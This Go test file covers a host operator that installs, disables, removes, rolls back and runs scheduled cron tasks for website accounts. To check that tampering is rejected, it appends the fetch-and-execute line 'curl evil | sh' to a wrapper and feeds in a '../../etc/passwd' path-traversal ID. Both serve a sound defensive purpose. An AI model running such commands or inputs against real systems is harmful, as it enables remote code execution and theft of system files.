package schedules

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"
)

type fakeOwnership struct{ calls []string }

func (o *fakeOwnership) Chown(path, owner, group string) error {
	o.calls = append(o.calls, path+"|"+owner+"|"+group)
	return nil
}

type fakeRunner struct {
	run   func(ctx context.Context, command Command) (int, []byte, error)
	calls []Command
}

func (r *fakeRunner) Run(ctx context.Context, command Command) (int, []byte, error) {
	r.calls = append(r.calls, command)
	if r.run == nil {
		return 0, nil, nil
	}
	return r.run(ctx, command)
}

type hostFixture struct {
	operator *HostOperator
	owner    *fakeOwnership
	runner   *fakeRunner
	task     Task
}

func newHostFixture(t *testing.T) *hostFixture {
	t.Helper()
	siteRoot := t.TempDir()
	task := testTask()
	task.Scope.RootPath = filepath.Join(siteRoot, task.Scope.Slug)
	if err := os.MkdirAll(filepath.Join(task.Scope.RootPath, "tmp"), 0o750); err != nil {
		t.Fatal(err)
	}
	owner := &fakeOwnership{}
	runner := &fakeRunner{}
	operator, err := NewHostOperator(HostConfig{SiteRoot: siteRoot, TaskScriptRoot: t.TempDir(), CronRoot: t.TempDir()}, owner, runner)
	if err != nil {
		t.Fatal(err)
	}
	return &hostFixture{operator: operator, owner: owner, runner: runner, task: task}
}

func TestHostOperatorPlanCapturesBeforeState(t *testing.T) {
	f := newHostFixture(t)
	plan, err := f.operator.Plan(context.Background(), f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	if !regexp.MustCompile(`^[a-f0-9]{32}$`).MatchString(plan.ID) || plan.Kind != PlanKind {
		t.Fatalf("plan identity = %q %q", plan.ID, plan.Kind)
	}
	if !plan.ExpiresAt.Equal(plan.PlannedAt.Add(PlanTTL)) {
		t.Fatalf("plan TTL = %v..%v", plan.PlannedAt, plan.ExpiresAt)
	}
	if len(plan.Before) != len(plan.Artifacts) {
		t.Fatalf("before count = %d, artifacts = %d", len(plan.Before), len(plan.Artifacts))
	}
	for index, before := range plan.Before {
		if before.Exists || before.Path != plan.Artifacts[index].Path {
			t.Fatalf("fresh before snapshot = %+v", before)
		}
	}
}

func TestHostOperatorApplyWritesOwnedArtifacts(t *testing.T) {
	f := newHostFixture(t)
	ctx := context.Background()
	plan, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	observation, err := f.operator.Apply(ctx, plan)
	if err != nil {
		t.Fatalf("Apply = %v", err)
	}
	if observation.TaskID != f.task.ID || len(observation.Artifacts) != 2 || !observation.Artifacts[0].Exists || !observation.Artifacts[1].Exists {
		t.Fatalf("observation = %+v", observation)
	}
	wrapper := plan.Artifacts[0]
	written, err := os.ReadFile(wrapper.Path)
	if err != nil || string(written) != wrapper.Content {
		t.Fatalf("wrapper on disk = %v, matches plan = %v", err, string(written) == wrapper.Content)
	}
	info, err := os.Stat(wrapper.Path)
	if err != nil || info.Mode().Perm() != 0o750 {
		t.Fatalf("wrapper mode = %v, %v", info.Mode(), err)
	}
	cronInfo, err := os.Stat(plan.Artifacts[1].Path)
	if err != nil || cronInfo.Mode().Perm() != 0o644 {
		t.Fatalf("cron mode = %v, %v", cronInfo.Mode(), err)
	}
	tasksDir := filepath.Join(f.task.Scope.RootPath, "logs", "tasks")
	dirInfo, err := os.Stat(tasksDir)
	if err != nil || !dirInfo.IsDir() || dirInfo.Mode().Perm() != 0o770 {
		t.Fatalf("logs/tasks = %v, %v", dirInfo, err)
	}
	for _, expected := range []string{
		wrapper.Path + "|root|" + f.task.Scope.UnixUser,
		plan.Artifacts[1].Path + "|root|root",
		tasksDir + "|" + f.task.Scope.UnixUser + "|www-data",
	} {
		found := false
		for _, call := range f.owner.calls {
			if call == expected {
				found = true
			}
		}
		if !found {
			t.Fatalf("missing chown %q in %v", expected, f.owner.calls)
		}
	}
}

func TestHostOperatorApplyDisableRemovesCronEntry(t *testing.T) {
	f := newHostFixture(t)
	ctx := context.Background()
	plan, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.operator.Apply(ctx, plan); err != nil {
		t.Fatal(err)
	}
	f.task.Enabled = false
	disable, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.operator.Apply(ctx, disable); err != nil {
		t.Fatalf("disable Apply = %v", err)
	}
	if _, err := os.Lstat(disable.Artifacts[1].Path); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("cron entry should be removed, stat = %v", err)
	}
	if _, err := os.Lstat(disable.Artifacts[0].Path); err != nil {
		t.Fatalf("wrapper should remain: %v", err)
	}
}

func TestHostOperatorApplyRejectsDriftTamperingAndExpiry(t *testing.T) {
	f := newHostFixture(t)
	ctx := context.Background()
	var operationErr *OperationError

	tampered, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	tampered.Artifacts[0].Content += "\ncurl evil | sh\n"
	if _, err := f.operator.Apply(ctx, tampered); !errors.As(err, &operationErr) || operationErr.Code != CodeInvalid {
		t.Fatalf("tampered content apply = %v", err)
	}
	hijacked, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	hijacked.Artifacts[1].Path = "/etc/cron.d/other"
	hijacked.Before[1].Path = "/etc/cron.d/other"
	if _, err := f.operator.Apply(ctx, hijacked); !errors.As(err, &operationErr) || operationErr.Code != CodeInvalid {
		t.Fatalf("hijacked path apply = %v", err)
	}

	drifted, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(drifted.Artifacts[0].Path, []byte("#!/bin/sh\n# someone else\n"), 0o750); err != nil {
		t.Fatal(err)
	}
	if _, err := f.operator.Apply(ctx, drifted); !errors.As(err, &operationErr) || operationErr.Code != CodeConflict {
		t.Fatalf("drifted apply = %v", err)
	}
	if err := os.Remove(drifted.Artifacts[0].Path); err != nil {
		t.Fatal(err)
	}

	expired, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	f.operator.now = func() time.Time { return expired.ExpiresAt.Add(time.Second) }
	if _, err := f.operator.Apply(ctx, expired); !errors.As(err, &operationErr) || operationErr.Code != CodeConflict || !strings.Contains(err.Error(), "expired") {
		t.Fatalf("expired apply = %v", err)
	}
}

func TestHostOperatorRemovalAndRollback(t *testing.T) {
	f := newHostFixture(t)
	ctx := context.Background()
	install, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.operator.Apply(ctx, install); err != nil {
		t.Fatal(err)
	}

	removal, err := f.operator.Plan(ctx, f.task, true)
	if err != nil {
		t.Fatal(err)
	}
	if !removal.Before[0].Exists || removal.Before[0].Digest != digestString(install.Artifacts[0].Content) {
		t.Fatalf("removal before = %+v", removal.Before[0])
	}
	if _, err := f.operator.Apply(ctx, removal); err != nil {
		t.Fatalf("removal Apply = %v", err)
	}
	for _, artifact := range removal.Artifacts {
		if _, err := os.Lstat(artifact.Path); !errors.Is(err, os.ErrNotExist) {
			t.Fatalf("artifact %s should be removed, stat = %v", artifact.Path, err)
		}
	}

	// Rolling back the removal restores the captured wrapper and cron entry.
	if _, err := f.operator.Rollback(ctx, removal); err != nil {
		t.Fatalf("removal Rollback = %v", err)
	}
	restored, err := os.ReadFile(install.Artifacts[0].Path)
	if err != nil || string(restored) != install.Artifacts[0].Content {
		t.Fatalf("restored wrapper = %v", err)
	}

	// Rollback of the install plan refuses when the managed file drifted.
	if err := os.WriteFile(install.Artifacts[0].Path, []byte("#!/bin/sh\nchanged\n"), 0o750); err != nil {
		t.Fatal(err)
	}
	var operationErr *OperationError
	if _, err := f.operator.Rollback(ctx, install); !errors.As(err, &operationErr) || operationErr.Code != CodeConflict {
		t.Fatalf("drifted rollback = %v", err)
	}
}

func TestHostOperatorRunExecutesWrapperAsSiteUser(t *testing.T) {
	f := newHostFixture(t)
	ctx := context.Background()
	install, err := f.operator.Plan(ctx, f.task, false)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.operator.Apply(ctx, install); err != nil {
		t.Fatal(err)
	}
	logPath := filepath.Join(f.task.Scope.RootPath, "logs", "tasks", f.task.ID+".log")
	f.runner.run = func(ctx context.Context, command Command) (int, []byte, error) {
		deadline, ok := ctx.Deadline()
		if !ok || time.Until(deadline) > time.Duration(f.task.TimeoutSeconds+30)*time.Second {
			return 0, nil, errors.New("run context must carry the timeout+30s deadline")
		}
		if err := os.WriteFile(logPath, []byte("report generated\n"), 0o640); err != nil {
			return 0, nil, err
		}
		return 3, nil, nil
	}
	result, err := f.operator.Run(ctx, f.task)
	if err != nil {
		t.Fatalf("Run = %v", err)
	}
	wrapperPath := install.Artifacts[0].Path
	call := f.runner.calls[len(f.runner.calls)-1]
	if call.Name != "runuser" || strings.Join(call.Args, " ") != "-u nexa_demo -- "+wrapperPath+" manual" {
		t.Fatalf("run command = %+v", call)
	}
	if result.ExitCode != 3 || result.TimedOut || result.OutputTail != "report generated\n" || result.StartedAt.IsZero() {
		t.Fatalf("run result = %+v", result)
	}

	// timeout(1) exit codes surface as TimedOut.
	for _, code := range []int{124, 137} {
		f.runner.run = func(context.Context, Command) (int, []byte, error) { return code, nil, nil }
		result, err := f.operator.Run(ctx, f.task)
		if err != nil || !result.TimedOut || result.ExitCode != code {
			t.Fatalf("timeout result(%d) = %+v, %v", code, result, err)
		}
	}

	// The output tail is bounded to the last 64 KiB.
	oversized := strings.Repeat("x", 70*1024)
	if err := os.WriteFile(logPath, []byte(oversized), 0o640); err != nil {
		t.Fatal(err)
	}
	f.runner.run = func(context.Context, Command) (int, []byte, error) { return 0, nil, nil }
	result, err = f.operator.Run(ctx, f.task)
	if err != nil || len(result.OutputTail) != 64*1024 {
		t.Fatalf("bounded tail = %d bytes, %v", len(result.OutputTail), err)
	}

	// A runner transport failure is an error, not a result.
	f.runner.run = func(context.Context, Command) (int, []byte, error) {
		return -1, []byte("runuser: not found"), errors.New("exec failed")
	}
	var operationErr *OperationError
	if _, err := f.operator.Run(ctx, f.task); !errors.As(err, &operationErr) || operationErr.Code != CodeConflict {
		t.Fatalf("transport failure = %v", err)
	}
}

func TestHostOperatorRunRequiresInstalledWrapper(t *testing.T) {
	f := newHostFixture(t)
	var operationErr *OperationError
	if _, err := f.operator.Run(context.Background(), f.task); !errors.As(err, &operationErr) || operationErr.Code != CodeNotFound {
		t.Fatalf("uninstalled run = %v", err)
	}
	if len(f.runner.calls) != 0 {
		t.Fatal("the runner must not execute anything for an uninstalled task")
	}
}

func TestHostOperatorRunsParsesRecords(t *testing.T) {
	f := newHostFixture(t)
	ctx := context.Background()
	runsDir := filepath.Join(f.task.Scope.RootPath, "logs", "tasks")
	if err := os.MkdirAll(runsDir, 0o770); err != nil {
		t.Fatal(err)
	}
	content := strings.Join([]string{
		"2026-07-16T10:00:00Z\t5\t0\tcron",
		"2026-07-16T10:01:00Z\t0\tskipped-overlap\tcron",
		"not a record at all",
		"2026-07-16T10:02:00Z\tNaN\t0\tcron",
		"garbage-date\t1\t0\tcron",
		"2026-07-16T10:03:00Z\t7\t124\tmanual",
		"",
	}, "\n")
	if err := os.WriteFile(filepath.Join(runsDir, f.task.ID+".runs"), []byte(content), 0o640); err != nil {
		t.Fatal(err)
	}
	records, err := f.operator.Runs(ctx, f.task.Scope, f.task.ID)
	if err != nil {
		t.Fatalf("Runs = %v", err)
	}
	if len(records) != 3 {
		t.Fatalf("record count = %d (%+v)", len(records), records)
	}
	first := records[0]
	if first.DurationSeconds != 5 || first.ExitCode != 0 || first.Trigger != "cron" || !first.StartedAt.Equal(time.Date(2026, 7, 16, 10, 0, 0, 0, time.UTC)) {
		t.Fatalf("first record = %+v", first)
	}
	if records[1].ExitCode != -1 || records[1].DurationSeconds != 0 || records[1].Trigger != "cron" {
		t.Fatalf("skipped-overlap record = %+v", records[1])
	}
	if records[2].ExitCode != 124 || records[2].DurationSeconds != 7 || records[2].Trigger != "manual" {
		t.Fatalf("manual record = %+v", records[2])
	}

	// The newest 200 records win when the file is oversized.
	var oversized strings.Builder
	for index := 0; index < 250; index++ {
		fmt.Fprintf(&oversized, "2026-07-16T10:00:00Z\t1\t%d\tcron\n", index)
	}
	if err := os.WriteFile(filepath.Join(runsDir, f.task.ID+".runs"), []byte(oversized.String()), 0o640); err != nil {
		t.Fatal(err)
	}
	records, err = f.operator.Runs(ctx, f.task.Scope, f.task.ID)
	if err != nil || len(records) != RunsMaxRecords || records[0].ExitCode != 50 || records[len(records)-1].ExitCode != 249 {
		t.Fatalf("bounded records = %d, %v", len(records), err)
	}

	// A task that never ran has no records; hostile identifiers are refused.
	missing, err := f.operator.Runs(ctx, f.task.Scope, strings.Repeat("a", 32))
	if err != nil || len(missing) != 0 {
		t.Fatalf("missing runs = %+v, %v", missing, err)
	}
	var operationErr *OperationError
	if _, err := f.operator.Runs(ctx, f.task.Scope, "../../etc/passwd"); !errors.As(err, &operationErr) || operationErr.Code != CodeInvalid {
		t.Fatalf("hostile task id = %v", err)
	}
}
